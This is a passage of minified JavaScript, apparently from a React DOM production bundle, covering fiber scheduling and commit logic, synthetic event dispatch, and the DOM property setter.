a=n.tag;if((a===0||a===11||a===15)&&n.flags&16384&&(a=n.updateQueue,a!==null&&(a=a.stores,a!==null)))for(var r=0;r<a.length;r++){var l=a[r],u=l.getSnapshot;l=l.value;try{if(!ii(u(),l))return!1}catch{return!1}}if(a=n.child,n.subtreeFlags&16384&&a!==null)a.return=n,n=a;else{if(n===t)break;for(;n.sibling===null;){if(n.return===null||n.return===t)return!0;n=n.return}n.sibling.return=n.return,n=n.sibling}}return!0}function nr(t,n,a,r){n=Hi(t,n),n&=~bc,n&=~zr,t.suspendedLanes|=n,t.pingedLanes&=~n,r&&(t.warmLanes|=n),r=t.expirationTimes;for(var l=n;0<l;){var u=31-ue(l),g=1<<u;r[u]=-1,l&=~g}a!==0&&xr(t,a,n)}function wc(){return(Fe&6)===0?(qo(0),!1):!0}function Cd(){if(Me!==null){if(Xe===0)var t=Me.return;else t=Me,ga=Tr=null,If(t),ms=null,wo=0,t=Me;for(;t!==null;)yg(t.alternate,t),t=t.return;Me=null}}function ws(t,n){var a=t.timeoutHandle;return a!==-1&&(t.timeoutHandle=-1,dM(a)),a=t.cancelPendingCommit,a!==null&&(t.cancelPendingCommit=null,a()),Ji=0,Cd(),Ke=t,Me=a=pa(t.current,null),Te=n,Xe=0,si=null,$a=!1,Es=za(t,n),bd=!1,bs=oi=bc=zr=tr=on=0,Kn=ko=null,Td=!1,Ma=Hi(t,n),zl(),a}function $g(t,n){he=null,_t.H=lc,n===ps||n===Zl?(n=s0(),Xe=3):n===Ef?(n=s0(),Xe=4):Xe=n===Qf?8:n!==null&&typeof n=="object"&&typeof n.then=="function"?6:1,si=n,Me===null&&(on=1,cc(t,gi(n,t.current)))}function t_(){var t=Rn.current;return t===null?!0:(Te&4194048)===Te?Ln===null:(Te&62914560)===Te||(Te&536870912)!==0?t===Ln:!1}function e_(){var t=_t.H;return _t.H=lc,t===null?lc:t}function n_(){var t=_t.A;return _t.A=Hy,t}function Nc(){on=4,$a||(Te&4194048)!==Te&&Rn.current!==null||(Es=!0),(tr&134217727)===0&&(zr&134217727)===0||Ke===null||nr(Ke,Te,oi,!1)}function wd(t,n,a){var r=Fe;Fe|=2;var l=e_(),u=n_();(Ke!==t||Te!==n)&&(Rc=null,ws(t,n)),n=!1;var g=on;t:do try{if(Xe!==0&&Me!==null){var R=Me,I=si;switch(Xe){case 8:Cd(),g=6;break t;case 3:case 2:case 9:case 6:Rn.current===null&&(n=!0);var Q=Xe;if(Xe=0,si=null,Ns(t,R,I,Q),a&&Es){g=0;break t}break;default:Q=Xe,Xe=0,si=null,Ns(t,R,I,Q)}}Xy(),g=on;break}catch(ct){$g(t,ct)}while(!0);return n&&t.shellSuspendCounter++,ga=Tr=null,Fe=r,_t.H=l,_t.A=u,Me===null&&(Ke=null,Te=0,zl()),g}function Xy(){for(;Me!==null;)i_(Me)}function ky(t,n){var a=Fe;Fe|=2;var r=e_(),l=n_();Ke!==t||Te!==n?(Rc=null,Ac=Wt()+500,ws(t,n)):Es=za(t,n);t:do try{if(Xe!==0&&Me!==null){n=Me;var u=si;e:switch(Xe){case 1:Xe=0,si=null,Ns(t,n,u,1);break;case 2:case 9:if(a0(u)){Xe=0,si=null,a_(n);break}n=function(){Xe!==2&&Xe!==9||Ke!==t||(Xe=7),$i(t)},u.then(n,n);break t;case 3:Xe=7;break t;case 4:Xe=5;break t;case 7:a0(u)?(Xe=0,si=null,a_(n)):(Xe=0,si=null,Ns(t,n,u,7));break;case 5:var g=null;switch(Me.tag){case 26:g=Me.memoizedState;case 5:case 27:var R=Me;if(g?K_(g):R.stateNode.complete){Xe=0,si=null;var I=R.sibling;if(I!==null)Me=I;else{var Q=R.return;Q!==null?(Me=Q,Dc(Q)):Me=null}break e}}Xe=0,si=null,Ns(t,n,u,5);break;case 6:Xe=0,si=null,Ns(t,n,u,6);break;case 8:Cd(),on=6;break t;default:throw Error(s(462))}}Wy();break}catch(ct){$g(t,ct)}while(!0);return ga=Tr=null,_t.H=r,_t.A=l,Fe=a,Me!==null?0:(Ke=null,Te=0,zl(),on)}function Wy(){for(;Me!==null&&!Ft();)i_(Me)}function i_(t){var n=xg(t.alternate,t,Ma);t.memoizedProps=t.pendingProps,n===null?Dc(t):Me=n}function a_(t){var n=t,a=n.alternate;switch(n.tag){case 15:case 0:n=dg(a,n,n.pendingProps,n.type,void 0,Te);break;case 11:n=dg(a,n,n.pendingProps,n.type.render,n.ref,Te);break;case 5:If(n);var r=n;r===Mn&&(xe?(Xl(r),r.tag===5&&r.stateNode!=null&&(Qe=r.stateNode)):(Xl(r),xe=!0));default:yg(a,n),n=Me=Ym(n,Ma),n=xg(a,n,Ma)}t.memoizedProps=t.pendingProps,n===null?Dc(t):Me=n}function Ns(t,n,a,r){ga=Tr=null,If(n),ms=null,wo=0;var l=n.return;try{if(Uy(t,l,n,a,Te)){on=1,cc(t,gi(a,t.current)),Me=null;return}}catch(u){if(l!==null)throw Me=l,u;on=1,cc(t,gi(a,t.current)),Me=null;return}n.flags&32768?(xe||r===1?t=!0:Es||(Te&536870912)!==0?t=!1:($a=t=!0,(r===2||r===9||r===3||r===6)&&(r=Rn.current,r!==null&&r.tag===13&&(r.flags|=16384))),r_(n,t)):Dc(n)}function Dc(t){var n=t;do{if((n.flags&32768)!==0){r_(n,$a);return}t=n.return;var a=Iy(n.alternate,n,Ma);if(a!==null){Me=a;return}if(n=n.sibling,n!==null){Me=n;return}Me=n=t}while(n!==null);on===0&&(on=5)}function r_(t,n){do{var a=zy(t.alternate,t);if(a!==null){a.flags&=32767,Me=a;return}if(a=t.return,a!==null&&(a.flags|=32768,a.subtreeFlags=0,a.deletions=null),!n&&(t=t.sibling,t!==null)){Me=t;return}Me=t=a}while(t!==null);on=6,Me=null}function s_(t,n,a,r,l,u,g,R,I,Q,ct,yt){t.cancelPendingCommit=null;do Uc();while(nn!==0);if((Fe&6)!==0)throw Error(s(327));if(n!==null){if(n===t.current)throw Error(s(177));t===Ke&&(Me=Ke=null,Te=0),Br=n,Di=t,Ji=a,Rd=l,Kg=r,qy(t,n,a,g,R,I,yt)}}function qy(t,n,a,r,l,u,g){var R=n.lanes|n.childLanes;if(Ad=R,R|=uf,Tl(t,a,R,r,l,u),As=null,(a&335544064)===a?(Rs=Sy(t),r=10262):(Rs=null,r=10256),(n.subtreeFlags&r)!==0||(n.flags&r)!==0?(t.callbackNode=null,t.callbackPriority=0,Jy(Nt,function(){return Ld(),null})):(t.callbackNode=null,t.callbackPriority=0),_c=!1,r=(n.flags&13878)!==0,(n.subtreeFlags&13878)!==0||r){r=_t.T,_t.T=null,l=Rt.p,Rt.p=2,u=Fe,Fe|=4;try{By(t,n,a)}finally{Fe=u,Rt.p=l,_t.T=r}}nn=1,_c?Ts=vM(g,t.containerInfo,Rs,Nd,Dd,Zy,Ud,Ld,Yy):(Nd(),Dd(),Ud())}function Yy(t){if(nn!==0){var n=Di.onRecoverableError;n(t,{componentStack:null})}}function Zy(){nn===3&&(nn=0,Vg(Br,Di),nn=4)}function Nd(){if(nn===1){nn=0;var t=Di,n=Br,a=Ji,r=(n.flags&13878)!==0;if((n.subtreeFlags&13878)!==0||r){r=_t.T,_t.T=null;var l=Rt.p;Rt.p=2;var u=Fe;Fe|=4;try{Go=Sc=!1,Hg(n,t,a),a=Wd;var g=zm(t.containerInfo),R=a.focusedElem,I=a.selectionRange;if(g!==R&&R&&R.ownerDocument&&Im(R.ownerDocument.documentElement,R)){if(I!==null&&rf(R)){var Q=I.start,ct=I.end;if(ct===void 0&&(ct=Q),"selectionStart"in R)R.selectionStart=Q,R.selectionEnd=Math.min(ct,R.value.length);else{var yt=R.ownerDocument||document,Z=yt&&yt.defaultView||window;if(Z.getSelection){var st=Z.getSelection(),It=R.textContent.length,Qt=Math.min(I.start,It),pe=I.end===void 0?Qt:Math.min(I.end,It);!st.extend&&Qt>pe&&(g=pe,pe=Qt,Qt=g);var K=Pm(R,Qt),G=Pm(R,pe);if(K&&G&&(st.rangeCount!==1||st.anchorNode!==K.node||st.anchorOffset!==K.offset||st.focusNode!==G.node||st.focusOffset!==G.offset)){var nt=yt.createRange();nt.setStart(K.node,K.offset),st.removeAllRanges(),Qt>pe?(st.addRange(nt),st.extend(G.node,G.offset)):(nt.setEnd(G.node,G.offset),st.addRange(nt))}}}}for(yt=[],st=R;st=st.parentNode;)st.nodeType===1&&yt.push({element:st,left:st.scrollLeft,top:st.scrollTop});for(typeof R.focus=="function"&&R.focus(),R=0;R<yt.length;R++){var St=yt[R];St.element.scrollLeft=St.left,St.element.scrollTop=St.top}}Bs=!!kd,Wd=kd=null}finally{Fe=u,Rt.p=l,_t.T=r}}t.current=n,nn=2}}function Dd(){if(nn===2){nn=0;var t=Di,n=Br,a=(n.flags&8772)!==0;if((n.subtreeFlags&8772)!==0||a){a=_t.T,_t.T=null;var r=Rt.p;Rt.p=2;var l=Fe;Fe|=4;try{Og(t,n.alternate,n)}finally{Fe=l,Rt.p=r,_t.T=a}}nn=3}}function Ud(){if(nn===4||nn===3){nn=0;var t=Ts;Ts=null,zt();var n=Di,a=Br,r=Ji,l=Kg,u=(r&335544064)===r?10262:10256;if((a.subtreeFlags&u)!==0||(a.flags&u)!==0?nn=5:(nn=0,Br=Di=null,o_(n,n.pendingLanes)),u=n.pendingLanes,u===0&&(er=null),po(r),a=a.stateNode,Xt&&typeof Xt.onCommitFiberRoot=="function")try{Xt.onCommitFiberRoot(Jt,a,void 0,(a.current.flags&128)===128)}catch{}if(l!==null){a=_t.T,u=Rt.p,Rt.p=2,_t.T=null;try{for(var g=n.onRecoverableError,R=0;R<l.length;R++){var I=l[R];g(I.value,{componentStack:I.stack})}}finally{_t.T=a,Rt.p=u}}if(l=As,g=Rs,Rs=null,l!==null&&(As=null,g===null&&(g=[]),t!==null))for(I=0;I<l.length;I++)a=(0,l[I])(g),a!==void 0&&t.finished.finally(a);(Ji&3)!==0&&Uc(),$i(n),u=n.pendingLanes,(r&261930)!==0&&(u&42)!==0?n===Cc?Wo++:(Wo=0,Cc=n):(Wo=0,Cc=null),qo(0)}}function o_(t,n){(t.pooledCacheLanes&=n)===0&&(n=t.pooledCache,n!=null&&(t.pooledCache=null,Ao(n)))}function Uc(){return Ts!==null&&(Ts.skipTransition(),Ts=null),Nd(),Dd(),Ud(),Ld()}function Ld(){if(nn!==5)return!1;var t=Di,n=Ad;Ad=0;var a=po(Ji),r=_t.T,l=Rt.p;try{Rt.p=32>a?32:a,_t.T=null,a=Rd,Rd=null;var u=Di,g=Ji;if(nn=0,Br=Di=null,Ji=0,(Fe&6)!==0)throw Error(s(331));var R=Fe;if(Fe|=4,qg(u.current),Xg(u,u.current,g,a),Fe=R,qo(0,!1),Xt&&typeof Xt.onPostCommitFiberRoot=="function")try{Xt.onPostCommitFiberRoot(Jt,u)}catch{}return!0}finally{Rt.p=l,_t.T=r,o_(t,n)}}function l_(t,n,a){n=gi(a,n),n=jf(t.stateNode,n,2),t=Ya(t,n,2),t!==null&&(Gi(t,2),$i(t))}function ke(t,n,a){if(t.tag===3)l_(t,t,a);else for(;n!==null;){if(n.tag===3){l_(n,t,a);break}else if(n.tag===1){var r=n.stateNode;if(typeof n.type.getDerivedStateFromError=="function"||typeof r.componentDidCatch=="function"&&(er===null||!er.has(r))){t=gi(a,t),a=ag(2),r=Ya(n,a,2),r!==null&&(rg(a,r,n,t),Gi(r,2),$i(r));break}}n=n.return}}function Od(t,n,a){var r=t.pingCache;if(r===null){r=t.pingCache=new Gy;var l=new Set;r.set(n,l)}else l=r.get(n),l===void 0&&(l=new Set,r.set(n,l));l.has(a)||(bd=!0,l.add(a),t=Ky.bind(null,t,n,a),n.then(t,t))}function Ky(t,n,a){var r=t.pingCache;r!==null&&r.delete(n),t.pingedLanes|=t.suspendedLanes&a,t.warmLanes&=~a,Ke===t&&(Te&a)===a&&((on===4||on===3&&(Te&62914560)===Te&&300>Wt()-Tc)&&(Fe&2)===0?ws(t,0):bc|=a,bs===Te&&(bs=0)),$i(t)}function c_(t,n){n===0&&(n=co()),t=Mr(t,n),t!==null&&(Gi(t,n),$i(t))}function jy(t){var n=t.memoizedState,a=0;n!==null&&(a=n.retryLane),c_(t,a)}function Qy(t,n){var a=0;switch(t.tag){case 31:case 13:var r=t.stateNode,l=t.memoizedState;l!==null&&(a=l.retryLane);break;case 19:r=t.stateNode;break;case 22:r=t.stateNode._retryCache;break;default:throw Error(s(314))}r!==null&&r.delete(n),c_(t,a)}function Jy(t,n){return Dt(t,n)}var Ds=null,Us=null,Pd=!1,Lc=!1,Id=!1,ir=0;function $i(t){t!==Us&&t.next===null&&(Us===null?Ds=Us=t:Us=Us.next=t),Lc=!0,Pd||(Pd=!0,tM())}function qo(t,n){if(!Id&&Lc){Id=!0;do for(var a=!1,r=Ds;r!==null;){if(t!==0){var l=r.pendingLanes;if(l===0)var u=0;else{var g=r.suspendedLanes,R=r.pingedLanes;u=(1<<31-ue(42|t)+1)-1,u&=l&~(g&~R),u=u&201326741?u&201326741|1:u?u|2:0}u!==0&&(a=!0,h_(r,u))}else u=Te,u=vr(r,r===Ke?u:0,r.cancelPendingCommit!==null||r.timeoutHandle!==-1),(u&3)===0||za(r,u)||(a=!0,h_(r,u));r=r.next}while(a);Id=!1}}function $y(){u_()}function u_(){Lc=Pd=!1;var t=0;ir!==0&&fM()&&(t=ir);for(var n=Wt(),a=null,r=Ds;r!==null;){var l=r.next,u=f_(r,n);u===0?(r.next=null,a===null?Ds=l:a.next=l,l===null&&(Us=a)):(a=r,(t!==0||(u&3)!==0)&&(Lc=!0)),r=l}nn!==0&&nn!==5||qo(t),ir!==0&&(ir=0)}function f_(t,n){for(var a=t.suspendedLanes,r=t.pingedLanes,l=t.expirationTimes,u=t.pendingLanes&-62914561;0<u;){var g=31-ue(u),R=1<<g,I=l[g];I===-1?((R&a)===0||(R&r)!==0)&&(l[g]=lo(R,n)):I<=n&&(t.expiredLanes|=R),u&=~R}if(n=Ke,a=Te,a=vr(t,t===n?a:0,t.cancelPendingCommit!==null||t.timeoutHandle!==-1),r=t.callbackNode,a===0||t===n&&(Xe===2||Xe===9)||t.cancelPendingCommit!==null)return r!==null&&r!==null&&$t(r),t.callbackNode=null,t.callbackPriority=0;if((a&3)===0||za(t,a)){if(n=a&-a,n===t.callbackPriority)return n;switch(r!==null&&$t(r),po(a)){case 2:case 8:a=X;break;case 32:a=Nt;break;case 268435456:a=Ot;break;default:a=Nt}return r=d_.bind(null,t),a=Dt(a,r),t.callbackPriority=n,t.callbackNode=a,n}return r!==null&&r!==null&&$t(r),t.callbackPriority=2,t.callbackNode=null,2}function d_(t,n){if(nn!==0&&nn!==5)return t.callbackNode=null,t.callbackPriority=0,null;var a=t.callbackNode;if(Uc()&&t.callbackNode!==a)return null;var r=Te;return r=vr(t,t===Ke?r:0,t.cancelPendingCommit!==null||t.timeoutHandle!==-1),r===0?null:(Qg(t,r,n),f_(t,Wt()),t.callbackNode!=null&&t.callbackNode===a?d_.bind(null,t):null)}function h_(t,n){if(Uc())return null;Qg(t,n,!0)}function tM(){hM(function(){(Fe&6)!==0?Dt(ce,$y):u_()})}function zd(){if(ir===0){var t=Cr;t===0&&(t=$r,$r<<=1,($r&261888)===0&&($r=256)),ir=t}return ir}function p_(t){return t==null||typeof t=="symbol"||typeof t=="boolean"?null:typeof t=="function"?t:wl(t)}function eM(t,n,a,r,l){if(n==="submit"&&a&&a.stateNode===l){var u=p_((l[H]||null).action),g=r.submitter;g&&(n=(n=g[H]||null)?p_(n.formAction):g.getAttribute("formAction"),n!==null&&(u=n,g=null));var R=new Ll("action","action",null,r,l);t.push({event:R,listeners:[{instance:null,listener:function(){if(r.defaultPrevented){if(ir!==0){var I=new FormData(l,g);Wf(a,{pending:!0,data:I,method:l.method,action:u},null,I)}}else typeof u=="function"&&(R.preventDefault(),I=new FormData(l,g),Wf(a,{pending:!0,data:I,method:l.method,action:u},u,I))},currentTarget:l}]})}}for(var Bd=0;Bd<cf.length;Bd++){var Fd=cf[Bd],nM=Fd.toLowerCase(),iM=Fd[0].toUpperCase()+Fd.slice(1);Ri(nM,"on"+iM)}Ri(Hm,"onAnimationEnd"),Ri(Gm,"onAnimationIteration"),Ri(Vm,"onAnimationStart"),Ri("dblclick","onDoubleClick"),Ri("focusin","onFocus"),Ri("focusout","onBlur"),Ri(dy,"onTransitionRun"),Ri(hy,"onTransitionStart"),Ri(py,"onTransitionCancel"),Ri(Xm,"onTransitionEnd"),an("onMouseEnter",["mouseout","mouseover"]),an("onMouseLeave",["mouseout","mouseover"]),an("onPointerEnter",["pointerout","pointerover"]),an("onPointerLeave",["pointerout","pointerover"]),Gt("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),Gt("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),Gt("onBeforeInput",["compositionend","keypress","textInput","paste"]),Gt("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),Gt("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),Gt("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Yo="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),aM=new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(Yo));function m_(t,n){n=(n&4)!==0;for(var a=0;a<t.length;a++){var r=t[a],l=r.event;r=r.listeners;t:{var u=void 0;if(n)for(var g=r.length-1;0<=g;g--){var R=r[g],I=R.instance,Q=R.currentTarget;if(R=R.listener,I!==u&&l.isPropagationStopped())break t;u=R,l.currentTarget=Q;try{u(l)}catch(ct){Il(ct)}l.currentTarget=null,u=I}else for(g=0;g<r.length;g++){if(R=r[g],I=R.instance,Q=R.currentTarget,R=R.listener,I!==u&&l.isPropagationStopped())break t;u=R,l.currentTarget=Q;try{u(l)}catch(ct){Il(ct)}l.currentTarget=null,u=I}}}}function Ee(t,n){var a=n[at];a===void 0&&(a=n[at]=new Set);var r=t+"__bubble";a.has(r)||(g_(n,t,2,!1),a.add(r))}function Hd(t,n,a){var r=0;n&&(r|=4),g_(a,t,r,n)}var Oc="_reactListening"+Math.random().toString(36).slice(2);function Gd(t){if(!t[Oc]){t[Oc]=!0,He.forEach(function(a){a!=="selectionchange"&&(aM.has(a)||Hd(a,!1,t),Hd(a,!0,t))});var n=t.nodeType===9?t:t.ownerDocument;n===null||n[Oc]||(n[Oc]=!0,Hd("selectionchange",!1,n))}}function g_(t,n,a,r){switch(rv(n)){case 2:var l=jM;break;case 8:l=QM;break;default:l=oh}a=l.bind(null,n,a,t),l=void 0,!Zu||n!=="touchstart"&&n!=="touchmove"&&n!=="wheel"||(l=!0),r?l!==void 0?t.addEventListener(n,a,{capture:!0,passive:l}):t.addEventListener(n,a,!0):l!==void 0?t.addEventListener(n,a,{passive:l}):t.addEventListener(n,a,!1)}function Vd(t,n,a,r,l){var u=r;if((n&1)===0&&(n&2)===0&&r!==null)t:for(;;){if(r===null)return;var g=r.tag;if(g===3||g===4){var R=r.stateNode.containerInfo;if(R===l)break;if(g===4)for(g=r.return;g!==null;){var I=g.tag;if((I===3||I===4)&&g.stateNode.containerInfo===l)return;g=g.return}for(;R!==null;){if(g=re(R),g===null)return;if(I=g.tag,I===5||I===6||I===26||I===27){r=u=g;continue t}R=R.parentNode}}r=r.return}gm(function(){var Q=u,ct=qu(a),yt=[];t:{var Z=km.get(t);if(Z!==void 0){var st=Ll,It=t;switch(t){case"keypress":if(Dl(a)===0)break t;case"keydown":case"keyup":st=VS;break;case"focusin":It="focus",st=Ju;break;case"focusout":It="blur",st=Ju;break;case"beforeblur":case"afterblur":st=Ju;break;case"click":if(a.button===2)break t;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":st=xm;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":st=NS;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":st=YS;break;case Hm:case Gm:case Vm:st=LS;break;case Xm:st=KS;break;case"scroll":case"scrollend":st=CS;break;case"wheel":st=QS;break;case"copy":case"cut":case"paste":st=PS;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":st=ym;break;case"submit":st=WS;break;case"toggle":case"beforetoggle":st=$S}var Qt=(n&4)!==0,pe=!Qt&&(t==="scroll"||t==="scrollend"),K=Qt?Z!==null?Z+"Capture":null:Z;Qt=[];for(var G=Q,nt;G!==null;){var St=G;if(nt=St.stateNode,St=St.tag,St!==5&&St!==26&&St!==27||nt===null||K===null||(St=mo(G,K),St!=null&&Qt.push(Zo(G,St,nt))),pe)break;G=G.return}0<Qt.length&&(Z=new st(Z,It,null,a,ct),yt.push({event:Z,listeners:Qt}))}}if((n&7)===0){t:{if(st=t==="mouseover"||t==="pointerover",Z=t==="mouseout"||t==="pointerout",st&&a!==Wu&&(It=a.relatedTarget||a.fromElement)&&(re(It)||It[dt]))break t;(Z||st)&&(It=ct.window===ct?ct:(st=ct.ownerDocument)?st.defaultView||st.parentWindow:window,Z?(st=a.relatedTarget||a.toElement,Z=Q,st=st?re(st):null,st!==null&&(pe=f(st),Qt=st.tag,st!==pe||Qt!==5&&Qt!==27&&Qt!==6)&&(st=null)):(Z=null,st=Q),Z!==st&&(Qt=xm,St="onMouseLeave",K="onMouseEnter",G="mouse",(t==="pointerout"||t==="pointerover")&&(Qt=ym,St="onPointerLeave",K="onPointerEnter",G="pointer"),pe=Z==null?It:Yt(Z),nt=st==null?It:Yt(st),It=new Qt(St,G+"leave",Z,a,ct),It.target=pe,It.relatedTarget=nt,St=null,re(ct)===Q&&(Qt=new Qt(K,G+"enter",st,a,ct),Qt.target=nt,Qt.relatedTarget=pe,St=Qt),pe=St,Qt=Z&&st?D(Z,st,rM):null,Z!==null&&__(yt,It,Z,Qt,!1),st!==null&&pe!==null&&__(yt,pe,st,Qt,!0)))}t:{if(Z=Q?Yt(Q):window,st=Z.nodeName&&Z.nodeName.toLowerCase(),st==="select"||st==="input"&&Z.type==="file")var Zt=wm;else if(Rm(Z))if(Nm)Zt=cy;else{Zt=oy;var Ae=sy}else st=Z.nodeName,!st||st.toLowerCase()!=="input"||Z.type!=="checkbox"&&Z.type!=="radio"?Q&&ku(Q.elementType)&&(Zt=wm):Zt=ly;if(Zt&&(Zt=Zt(t,Q))){Cm(yt,Zt,a,ct);break t}Ae&&Ae(t,Z,Q)}switch(Ae=Q?Yt(Q):window,t){case"focusin":(Rm(Ae)||Ae.contentEditable==="true")&&(ss=Ae,sf=Q,Eo=null);break;case"focusout":Eo=sf=ss=null;break;case"mousedown":of=!0;break;case"contextmenu":case"mouseup":case"dragend":of=!1,Bm(yt,a,ct);break;case"selectionchange":if(fy)break;case"keydown":case"keyup":Bm(yt,a,ct)}var te;if(tf)t:{switch(t){case"compositionstart":var ae="onCompositionStart";break t;case"compositionend":ae="onCompositionEnd";break t;case"compositionupdate":ae="onCompositionUpdate";break t}ae=void 0}else rs?Tm(t,a)&&(ae="onCompositionEnd"):t==="keydown"&&a.keyCode===229&&(ae="onCompositionStart");ae&&(Mm&&a.locale!=="ko"&&(rs||ae!=="onCompositionStart"?ae==="onCompositionEnd"&&rs&&(te=_m()):(Ba=ct,Ku="value"in Ba?Ba.value:Ba.textContent,rs=!0)),Ae=Pc(Q,ae),0<Ae.length&&(ae=new Sm(ae,t,null,a,ct),yt.push({event:ae,listeners:Ae}),te?ae.data=te:(te=Am(a),te!==null&&(ae.data=te)))),(te=ey?ny(t,a):iy(t,a))&&(ae=Pc(Q,"onBeforeInput"),0<ae.length&&(Ae=new Sm("onBeforeInput","beforeinput",null,a,ct),yt.push({event:Ae,listeners:ae}),Ae.data=te)),eM(yt,t,Q,a,ct)}m_(yt,n)})}function Zo(t,n,a){return{instance:t,listener:n,currentTarget:a}}function Pc(t,n){for(var a=n+"Capture",r=[];t!==null;){var l=t,u=l.stateNode;if(l=l.tag,l!==5&&l!==26&&l!==27||u===null||(l=mo(t,a),l!=null&&r.unshift(Zo(t,l,u)),l=mo(t,n),l!=null&&r.push(Zo(t,l,u))),t.tag===3)return r;t=t.return}return[]}function rM(t){if(t===null)return null;do t=t.return;while(t&&t.tag!==5&&t.tag!==27);return t||null}function __(t,n,a,r,l){for(var u=n._reactName,g=[];a!==null&&a!==r;){var R=a,I=R.alternate,Q=R.stateNode;if(R=R.tag,I!==null&&I===r)break;R!==5&&R!==26&&R!==27||Q===null||(I=Q,l?(Q=mo(a,u),Q!=null&&g.unshift(Zo(a,Q,I))):l||(Q=mo(a,u),Q!=null&&g.push(Zo(a,Q,I)))),a=a.return}g.length!==0&&t.push({event:n,listeners:g})}var sM=/\r\n?/g,oM=/\u0000|\uFFFD/g;function v_(t){return(typeof t=="string"?t:""+t).replace(sM,`
`).replace(oM,"")}function x_(t,n){return n=v_(n),v_(t)===n}function We(t,n,a,r,l,u){switch(a){case"children":if(typeof r=="string")n==="body"||n==="textarea"&&r===""||ns(t,r);else if(typeof r=="number"||typeof r=="bigint")n!=="body"&&ns(t,""+r);else return;break;case"className":ni(t,"class",r);break;case"tabIndex":ni(t,"tabindex",r);break;case"dir":case"role":case"viewBox":case"width":case"height":ni(t,a,r);break;case"style":pm(t,r,u);return;case"data":if(n!=="object"){ni(t,"data",r);break}case"src":case"href":if(r===""&&(n!=="a"||a!=="href")){t.removeAttribute(a);break}if(r==null||typeof r=="function"||typeof r=="symbol"||typeof r=="boolean"){t.removeAttribute(a);break}r=wl(r),t.setAttribute(a,r);break;case"action":case"formAction":if(typeof r=="function"){t.setAttribute(a,"javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");break}else typeof u=="function"&&(a==="formAction"?(n!=="input"&&We(t,n,"name",l.name,l,null),We(t,n,"formEncType",l.formEncType,l,null),We(t,n,"formMethod",l.formMethod,l,null),We(t,n,"formTarget",l.formTarget,l,null)):(We(t,n,"encType",l.encType,l,null),We(t,n,"method",l.method,l,null),We(t,n,"target",l.target,l,null)));if(r==null||typeof r=="symbol"||typeof r=="boolean"){t.removeAttribute(a);break}r=wl(r),t.setAttribute(a,r);break;case"onClick":r!=null&&(t.onclick=Xi);return;case"onScroll":r!=null&&Ee("scroll",t);return;case"onScrollEnd":r!=null&&Ee("scrollend",t);return;case"dangerouslySetInnerHTML":if(r!=null){if(typeof r!="object"||!("__html"in r))throw Error(s(61));if(a=r.__html,a!=null){if(l.children!=null)throw Error(s(60));(u!=null?u.__html:void 0)!==a&&(t.innerHTML=a)}}break;case"multiple":t.multiple=r&&typeof r!="function"&&typeof r!="symbol";break;case"muted":t.muted=r&&typeof r!="function"&&typeof r!="symbol";break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"defaultValue":case"defaultChecked":case"innerHTML":case"ref":break;case"autoFocus":break;case"xlinkHref":if(r==null||typeof r=="function"||typeof r=="boolean"||typeof r=="symbol"){t.removeAttribute("xlink:href");break}a=wl(r),t.setAttributeNS("http://www.w3.org/1999/xlink","xlink:href",a);break;case"contentEditable":case"spellCheck":case"draggable":case"value":case"autoReverse":case"externalResourcesRequired":case"focusable":case"preserveAlpha":r!=null&&typeof r!="function"&&typeof r!="symbol"?t.setAttribute(a,r):t.removeAttribute(a);break;case"inert":case"allowFullScreen":case"async":case"autoPlay":case"controls":case"credentialless":case"default":case"defer":case"disabled":case"disablePictureInPicture":case"disableRemotePlayback":case"formNoValidate":case"hidden":case"loop":case"noModule":case"noValidate":case"open":case"playsInline":case"readOnly":case"required":case"reversed":case"scoped":case"seamless":case"itemScope":r&&typeof r!="function"&&typeof r!="symbol"?t.setAttribute(a,""):t.removeAttribute(a);break;case"capture":case"download":r===!0?t.setAttribute(a,""):r!==!1&&r!=null&&typeof r!="function"&&typeof r!="symbol"?t.setAttribute(a,r):t.removeAttribute(a);break;case"cols":case"rows":case"size":case"span":r!=null&&typeof r!="function"&&typeof r!="symbol"&&!isNaN(r)&&1<=r?t.setAttribute(a,r):t.removeAttribute(a);break;case"rowSpan":case"start":r==null||typeof r=="function"||typeof r=="symbol"||isNaN(r)?t.removeAttribute(a):t.setAttribute(a,r);break;case"popover":Ee("beforetoggle",t),Ee("toggle",t),je(t,"popover",r);break;case"xlinkActuate":be(t,"http://www.w3.org/1999/xlink","xlink:actuate",r);break;case"xlinkArcrole":be(t,"http://www.w3.org/1999/xlink","xlink:arcrole",r);break;case"xlinkRole":be(t,"http://www.w3.org/1999/xlink","xlink:role",r);break;case"xlinkShow":be(t,"http://www.w3.org/1999/xlink","xlink:show",r);break;case"xlinkTitle":be(t,"http://www.w3.org/1999/xlink","xlink:title",r);break;case"xlinkType":be(t,"http://www.w3.org/1999/xlink","xlink:type",r);break;case"xmlBase":be(t,"http://www.w3.org/XML/1998/namespace","xml:base",r);break;case"xmlLang":be(t,"http://www.w3.org/XML/1998/namespace","xml:lang",r);break;case"xmlSpace":be(t,"http://www.w3.org/XML/1998/namespace","xml:space",r);break;case"is":je(t,"is",r);break;case"innerText":case"textContent":return;default:if(!(2<a.length)||a[0]!=="o"&&a[0]!=="O"||a[1]!=="n"&&a[1]!=="N")a=AS.get(a)||a,je(t,a,r);else return}ve=!0}function Xd(t,n,a,r,l,u){switch(a){case"style":pm(t,r,u);return;case"dangerouslySetInnerHTML":if(r!=null){if(typeof r!="object"||!("__html"in r))throw Error(s(61));if(a=r.__html,a!=null){if(l.children!=null)throw Error(s(60));(u!=null?u.__html:void 